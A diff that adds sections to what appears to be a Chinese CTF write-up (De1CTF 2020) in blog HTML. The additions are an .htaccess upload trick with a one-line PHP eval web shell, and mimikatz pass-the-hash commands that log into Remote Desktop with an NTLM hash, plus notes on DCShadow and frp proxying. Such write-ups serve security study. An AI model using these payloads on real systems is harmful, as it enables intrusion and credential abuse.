@@ -117,6 +117,10 @@
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506115401614.png" alt="image-20200506115401614"></p>
 <p>查一下php手册，我靠知识点啊。不用闭合就能用，tql。</p>
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506115509609.png" alt="image-20200506115509609"></p>
+<blockquote>
+<p>参看Nu1l的wp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp yyy</span><br><span class="line">p\</span><br><span class="line">hp_value short_open_tag On</span><br><span class="line"></span><br><span class="line">2.yyy</span><br><span class="line">&lt;? eval($_POST[2333]);</span><br></pre></td></tr></table></figure>
+</blockquote>
 <h1 id="0x02-calc"><a href="#0x02-calc" class="headerlink" title="0x02 calc"></a>0x02 calc</h1><p>通过fuzz发现报错信息，</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"timestamp"</span>:<span class="string">"2020-05-04T02:36:32.156+0000"</span>,<span class="attr">"status"</span>:<span class="number">500</span>,<span class="attr">"error"</span>:<span class="string">"Internal Server Error"</span>,<span class="attr">"message"</span>:<span class="string">"Expression [@] @0: EL1059E: @ or &amp; can only be followed by an identifier or a quoted name"</span>,<span class="attr">"path"</span>:<span class="string">"/spel/calc"</span>&#125;</span><br></pre></td></tr></table></figure>
 
@@ -422,7 +426,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506085227520.png" alt="image-20200506085227520"></p>
-<p>可以看到上图框中的三个权限，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，进行DCShadow攻击需要打开两个mimikatz窗口，所以需要</p>
+<p>可以看到上图框中的三个权限，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，进行DCShadow攻击需要打开两个mimikatz窗口，所以需要开启远程桌面，这里利用<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>进行代理，frp使用请看另一篇文章，代理设置好之后，就可以利用这篇文章提到的<a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">Pass the Hash with Remote Desktop</a>利用ntlm直接登录远程桌面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:DM &#x2F;ntlm:B03094996601324646AC223BF30D0D07 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506151539110.png" alt="image-20200506151539110"></p>
+<blockquote>
+<p>Restricted Admin mode，直译为受限管理模式，主要功能是使得凭据不会暴露在目标系统中</p>
+<h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><ul>
+<li>Windows 8.1和Windows Server 2012 R2默认支持该功能</li>
+<li>Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</li>
+</ul>
+</blockquote>
 <p><a href="https://daiker.gitbook.io/" target="_blank" rel="noopener">https://daiker.gitbook.io/</a></p>
 <p><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/72190.html</a>  rdp</p>
 <p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py</a>   keburo</p>
